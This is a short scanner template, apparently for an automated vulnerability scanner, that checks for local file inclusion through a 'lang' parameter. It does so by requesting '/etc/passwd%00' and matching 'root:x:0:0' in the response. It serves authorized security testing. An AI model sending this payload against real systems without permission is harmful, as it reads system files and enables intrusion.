id: lfi6-1333
name: 'Traversal in lang'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via lang'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      lang:
        - '/etc/passwd%00'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
